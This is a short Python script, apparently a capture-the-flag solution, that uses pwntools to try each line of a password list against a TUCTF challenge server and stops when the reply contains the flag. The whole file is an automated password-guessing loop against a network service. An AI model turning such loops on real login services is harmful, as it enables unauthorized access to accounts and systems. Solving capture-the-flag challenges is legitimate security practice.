from pwn import *

f = open("passcode.txt", 'r')
Lines = f.readlines()

for line in Lines:
    r = remote("chals.tuctf.com", 30101)
    r.sendlineafter("Password:", line)
    res = r.recvlineS()
    if "TUCTF" in res:
        print(res)
        break
    r.close()